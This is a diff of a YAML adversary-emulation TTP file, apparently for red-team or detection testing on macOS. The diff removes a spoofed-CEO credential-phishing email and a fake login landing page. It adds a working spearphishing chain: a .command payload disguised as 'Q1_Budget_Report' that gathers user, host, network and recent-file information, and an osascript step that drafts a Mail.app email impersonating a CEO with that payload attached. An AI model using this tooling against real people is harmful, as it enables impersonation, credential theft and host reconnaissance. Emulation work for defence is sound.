@@ -1,13 +1,14 @@
 ---
 api_version: 2.0
 uuid: 3c7d5b0e-6f2a-4e9b-8a1d-2c5e7f1a3d8b
-name: Spear Phishing Simulation
+name: Spear Phishing Delivery
 authors:
   - mbhatt
 description: |
-  Demonstrates spear phishing simulation with highly targeted attacks using
-  specific victim information. Includes personalized content, contextual details,
-  and advanced social engineering to increase success rate.
+  Creates a targeted spearphishing payload and delivers it via Mail.app. Builds
+  a .command payload with embedded reconnaissance commands, crafts a personalized
+  HTML email body, composes the email with attachment in Mail.app using osascript,
+  and sets quarantine attributes on the payload file.
 
 mitre:
   tactics:
@@ -26,127 +27,117 @@ args:
     description: "Name of targeted individual"
     type: string
     default: "Sarah Johnson"
-  - name: victim_title
-    description: "Job title of target"
-    type: string
-    default: "Finance Director"
   - name: victim_company
     description: "Company where victim works"
     type: string
     default: "TechCorp Industries"
-  - name: sender_name
-    description: "Spoofed sender identity"
+  - name: payload_name
+    description: "Filename for the payload disguised as a document"
     type: string
-    default: "David Chen, CEO"
-  - name: specific_project
-    description: "Real project victim is working on"
-    type: string
-    default: "Q1 2025 Budget Allocation"
+    default: "Q1_Budget_Report.command"
 
 steps:
-  - name: gather_intelligence_on_target
-    description: Gather intelligence on target individual
+  - name: create_targeted_payload
+    description: Create a .command payload with embedded reconnaissance commands
     inline: |
-      mkdir -p /tmp/spear_phishing
-      cat > /tmp/spear_phishing/target_profile.txt << 'PROFILEEOF'
-      TARGET INTELLIGENCE PROFILE
-      Primary Target: {{ victim_name }}
-      Title: {{ victim_title }}
-      Company: {{ victim_company }}
-      Reports To: {{ sender_name }}
-      Current Major Project: {{ specific_project }}
-      PROFILEEOF
-      echo "Created target profile"
-    cleanup:
-      inline: |
-        rm -rf /tmp/spear_phishing
+      mkdir -p /tmp/ttp_spearphish
+      cat > /tmp/ttp_spearphish/{{ .Args.payload_name }} << 'PAYLOAD'
+      #!/bin/bash
+      # Targeted payload - disguised as a budget report
+      # Performs host reconnaissance upon execution
+      EXFIL_DIR="/tmp/.budget_data_$(date +%s)"
+      mkdir -p "${EXFIL_DIR}"
+      echo "=== System Info ===" > "${EXFIL_DIR}/recon.txt"
+      whoami >> "${EXFIL_DIR}/recon.txt"
+      hostname >> "${EXFIL_DIR}/recon.txt"
+      sw_vers >> "${EXFIL_DIR}/recon.txt"
+      echo "=== Network ===" >> "${EXFIL_DIR}/recon.txt"
+      ifconfig | grep "inet " >> "${EXFIL_DIR}/recon.txt"
+      echo "=== Users ===" >> "${EXFIL_DIR}/recon.txt"
+      dscl . list /Users | grep -v '^_' >> "${EXFIL_DIR}/recon.txt"
+      echo "=== Recent Files ===" >> "${EXFIL_DIR}/recon.txt"
+      ls -lt ~/Documents/ 2>/dev/null | head -10 >> "${EXFIL_DIR}/recon.txt"
+      echo "Report generated" && open -a TextEdit "${EXFIL_DIR}/recon.txt"
+      PAYLOAD
+      chmod +x /tmp/ttp_spearphish/{{ .Args.payload_name }}
+      echo "[+] Created targeted payload: /tmp/ttp_spearphish/{{ .Args.payload_name }}"
 
-  - name: create_spear_phishing_email
-    description: Create spear phishing email with personalized content
+  - name: create_phishing_email_body
+    description: Create a convincing personalized HTML email body
     inline: |
-      cat > /tmp/spear_phishing/spear_phishing_email.txt << 'EMAILEOF'
-      From: {{ sender_name }} <david.chen@techcorp-industries.com>
-      To: {{ victim_name }} <sarah.johnson@techcorp.com>
-      Subject: URGENT: {{ specific_project }} - Budget Revision Required
-
-      Hi {{ victim_name }},
-
-      I need your immediate assistance with a confidential matter regarding the
-      {{ specific_project }} budget allocation.
-
-      Please click the link below and sign in with your TechCorp credentials:
-      https://secure-techcorp-document-portal.com/verify-credentials
-
-      David Chen
-      Chief Executive Officer
-      TechCorp Industries
-      EMAILEOF
-      echo "Created spear phishing email"
-
-  - name: create_context_specific_landing_page
-    description: Create context-specific landing page
-    inline: |
-      cat > /tmp/spear_phishing/landing_page.html << 'HTMLEOF'
-      <!DOCTYPE html>
+      cat > /tmp/ttp_spearphish/email_body.html << HTMLEOF
       <html>
-      <head><title>TechCorp Secure Document Portal</title></head>
-      <body>
-        <h1>TechCorp Secure Document Portal</h1>
-        <p>Project: {{ specific_project }}</p>
-        <p>Requested By: {{ sender_name }}, CEO</p>
-        <form action="/portal/authenticate" method="POST">
-          <input type="email" name="email" placeholder="your.email@techcorp.com" required>
-          <input type="password" name="password" placeholder="Your TechCorp password" required>
-          <button type="submit">Access Confidential Documents</button>
-        </form>
+      <body style="font-family: -apple-system, sans-serif; color: #333;">
+      <p>Hi {{ .Args.victim_name }},</p>
+      <p>I hope this email finds you well. As discussed in our last meeting, please find
+      attached the Q1 Budget Report for your review. The board is expecting our final
+      numbers by end of week, so I would appreciate your prompt attention to this.</p>
+      <p>Please open the attached report and review the revised allocation figures.
+      Let me know if you have any questions.</p>
+      <p>Best regards,<br>
+      David Chen<br>
+      Chief Executive Officer<br>
+      {{ .Args.victim_company }}<br>
+      <span style="color: #888; font-size: 12px;">Sent from my iPhone</span></p>
       </body>
       </html>
       HTMLEOF
-      echo "Created spear phishing landing page"
+      echo "[+] Created personalized HTML email body"
 
-  - name: create_execution_plan
-    description: Create spear phishing execution plan
+  - name: compose_email_with_attachment
+    description: Use osascript to compose the spearphishing email in Mail.app
     inline: |
-      cat > /tmp/spear_phishing/execution_plan.txt << 'PLANEOF'
-      SPEAR PHISHING EXECUTION PLAN
-      PHASE 1: TIMING - Send at 4:55 PM
-      PHASE 2: DELIVERY - Spoofed email from CEO
-      PHASE 3: EXPLOITATION - Credential capture via landing page
-      PHASE 4: POST-COMPROMISE - Use captured credentials
-      PLANEOF
-      echo "Created execution plan"
+      EMAIL_BODY=$(cat /tmp/ttp_spearphish/email_body.html)
+      ATTACHMENT_PATH="/tmp/ttp_spearphish/{{ .Args.payload_name }}"
+      osascript << APPLESCRIPT
+      tell application "Mail"
+        set newMessage to make new outgoing message with properties {subject:"Q1 Budget Report - Please Review", content:"${EMAIL_BODY}", visible:true}
+        tell newMessage
+          make new to recipient at end of to recipients with properties {name:"{{ .Args.victim_name }}", address:"victim@{{ .Args.victim_company }}.com"}
+          make new attachment with properties {file name:POSIX file "${ATTACHMENT_PATH}"} at after the last paragraph
+        end tell
+      end tell
+      APPLESCRIPT
+      echo "[+] Composed spearphishing email in Mail.app with payload attachment"
 
-  - name: log_spear_phishing_setup
-    description: Log spear phishing campaign setup
+  - name: set_quarantine_on_payload
+    description: Set quarantine extended attributes on the payload file
     inline: |
-      mkdir -p /tmp/spear_logs
-      timestamp=$(date +%Y%m%d_%H%M%S)
-      cat > /tmp/spear_logs/campaign_${timestamp}.log << 'LOGEOF'
-      Spear Phishing Campaign Initiated
-      Target: {{ victim_name }} ({{ victim_title }})
-      Company: {{ victim_company }}
-      Sender Spoofed: {{ sender_name }}
-      Campaign Theme: {{ specific_project }}
-      LOGEOF
+      xattr -w com.apple.quarantine "0081;$(printf '%x' $(date +%s));Mail;$(uuidgen)" /tmp/ttp_spearphish/{{ .Args.payload_name }}
+      echo "[+] Quarantine attribute set on payload"
+      echo "[+] Extended attributes:"
+      xattr -l /tmp/ttp_spearphish/{{ .Args.payload_name }}
+
+  - name: verify_payload_crafted
+    description: Verify the payload is properly crafted and the email was composed
+    inline: |
+      echo "[+] Payload verification:"
+      file /tmp/ttp_spearphish/{{ .Args.payload_name }}
+      echo ""
+      echo "[+] Payload permissions:"
+      ls -la /tmp/ttp_spearphish/{{ .Args.payload_name }}
+      echo ""
+      echo "[+] Quarantine check:"
+      xattr -p com.apple.quarantine /tmp/ttp_spearphish/{{ .Args.payload_name }} 2>/dev/null && echo "[+] Quarantine xattr present"
+      echo ""
+      echo "[+] Mail.app outgoing messages:"
+      osascript -e 'tell application "Mail" to get subject of every outgoing message' 2>/dev/null
+      echo "[+] PASS: Spearphishing payload and email are ready"
     cleanup:
       inline: |
-        rm -rf /tmp/spear_logs
-
-  - name: verify_target_profile_created
-    description: Verify target profile was created
-    inline: |
-      test -f /tmp/spear_phishing/target_profile.txt && echo "PASS: Target profile created"
-
-  - name: verify_spear_phishing_email_created
-    description: Verify spear phishing email was created
-    inline: |
-      test -f /tmp/spear_phishing/spear_phishing_email.txt && echo "PASS: Spear phishing email created"
-
-  - name: verify_landing_page_created
-    description: Verify landing page was created
-    inline: |
-      test -f /tmp/spear_phishing/landing_page.html && echo "PASS: Landing page created"
+        osascript << 'APPLESCRIPT'
+        tell application "Mail"
+          set msgList to every outgoing message
+          repeat with msg in msgList
+            if subject of msg contains "Q1 Budget Report" then
+              delete msg
+            end if
+          end repeat
+        end tell
+        APPLESCRIPT
+        rm -rf /tmp/ttp_spearphish
+        echo "[+] Cleanup: Email draft deleted and payload files removed"
 
 tests:
-  - name: spear_phishing_simulation_test
+  - name: spear_phishing_delivery_test
     dry_run: true
